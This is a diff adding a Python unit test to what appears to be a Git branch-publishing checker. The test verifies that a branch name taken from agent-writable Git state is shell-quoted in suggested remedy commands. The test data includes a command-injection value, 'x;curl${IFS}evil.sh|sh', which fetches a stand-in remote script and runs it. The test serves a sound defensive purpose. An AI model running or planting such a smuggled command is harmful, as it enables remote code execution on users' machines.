@@ -542,6 +542,16 @@ class IdentityTests(CheckpointCase):
         self.assertFalse(path.resolve().is_relative_to(self.repo.root))
         self.assertEqual(json.loads(path.read_text()), {"branch": "feat-x"})
 
+    def test_remedy_quotes_names_from_git_state(self) -> None:
+        # Round 4: a branch name from agent-writable Git state must never
+        # become a pasteable shell command.
+        evil = "x;curl${IFS}evil.sh|sh"
+        git(self.repo.root, "checkout", "-q", "-b", evil)
+        outcome = self.check()
+        self.assertOutcome(outcome, "pending", "not-published")
+        self.assertIn("git push -u origin 'x;curl${IFS}evil.sh|sh'", outcome.remedy)
+        self.assertEqual(self.fake.gh_calls(), [])
+
     def test_non_github_remote_is_unlinked(self) -> None:
         git(self.repo.root, "remote", "set-url", "origin", "https://gitlab.com/o/r.git")
         self.assertOutcome(self.check(), "blocked-unlinked", "not-github")
